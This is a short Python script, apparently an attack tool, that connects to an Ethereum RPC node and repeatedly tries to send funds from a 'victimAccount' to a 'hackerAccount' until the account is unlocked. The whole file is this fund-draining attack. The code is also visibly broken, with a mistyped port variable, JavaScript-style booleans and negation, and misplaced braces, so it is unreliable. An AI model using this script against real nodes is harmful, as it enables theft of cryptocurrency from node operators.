from web3 import Web3, HTTPProvider
from .config import ip, rpcPort, victimAccount, hackerAccount, amount

w3 = Web3(HTTPProvider(ip + ':' + prcPort))

isHached = false

while (!isHached):
	try:
		w3.eth.sendTransaction({'from': victimAccount, 'to': hackerAccount}, 'value': amount)
		isHached = true
	except ValueError:
		print('--Locked--')

print('Success!!!')